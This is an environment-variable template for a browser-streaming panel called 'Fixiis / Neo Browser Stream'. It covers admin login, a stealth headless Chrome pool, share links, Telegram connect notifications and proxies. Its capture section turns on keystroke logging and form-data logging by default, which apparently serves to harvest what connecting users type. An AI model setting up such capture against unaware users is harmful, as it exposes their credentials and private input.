# ============================================================================
# Fixiis / Neo Browser Stream — environment template
#
# Copy to .env and fill in. main.py loads .env automatically at startup
# (before config.py is imported), so anything set here wins over the
# defaults baked into config.py.
#
#   cp .env.example .env
#   chmod 600 .env
#
# NEVER commit .env — it is already in .gitignore.
# ============================================================================

# ---------------------------------------------------------------- required
# The app logs in with ADMIN_USERNAME + the bcrypt hash in
# ADMIN_PASSWORD_HASH. Generate a hash with:
#   python3 -c "import bcrypt;print(bcrypt.hashpw(b'YOUR_PASSWORD',bcrypt.gensalt(12)).decode())"
# The shipped default hash corresponds to a well-known password — change it.
ADMIN_USERNAME=admin
ADMIN_PASSWORD_HASH=

# Public address clients and browsers will reach you on. Used to build
# share links and WebSocket URLs. Set this or links will point at a stale IP.
PUBLIC_IP=
SERVER_DOMAIN=panel.example.com
USE_HTTPS=true

# ---------------------------------------------------------------- network
HOST=127.0.0.1
PORT=8446

# Comma-separated list of origins allowed to call the API. Needed when the
# admin panels are hosted somewhere else (Netlify, Pages, S3, or opened
# from disk). Leave unset for "*", which allows any origin.
# ALLOWED_ORIGINS=https://panel.example.com,https://ops.netlify.app

# ---------------------------------------------------------------- browser
# sb = SeleniumBase real-Chrome stealth backend (default, recommended)
# playwright = Playwright fallback backend
BROWSER_BACKEND=sb
HEADLESS=true
STEALTH_MODE=true
USE_SYSTEM_CHROME=true
# CHROME_PATH=/usr/bin/google-chrome
BROWSER_POOL_SIZE=10
MAX_SESSIONS=20

# ---------------------------------------------------------------- telegram
# Revoke and recreate the bot token via @BotFather before setting it here.
TELEGRAM_ENABLED=false
TELEGRAM_BOT_TOKEN=
TELEGRAM_CHAT_ID=
TELEGRAM_ADMIN_IDS=
TELEGRAM_NOTIFY_ON_CONNECT=false
TELEGRAM_ADMIN_USERNAME=
TELEGRAM_ADMIN_PASSWORD=

# ---------------------------------------------------------------- proxy
PROXY_ENABLED=false
PROXY_SERVER=
PROXY_USERNAME=
PROXY_PASSWORD=

# ---------------------------------------------------------------- capture
# Keystroke logging is on by default in config.py. If you do not need it,
# turn it off here.
KEYLOG_ENABLED=true
KEYLOG_LOG_FORM_DATA=true
ENABLE_EXTENSION_CAPTURE=true
ENABLE_LIVE_LIBRARY=true

# ---------------------------------------------------------------- tuning
TARGET_FPS=30
QUALITY=80
USE_GPU=false
DEBUG_MODE=false
ENABLE_METRICS=false
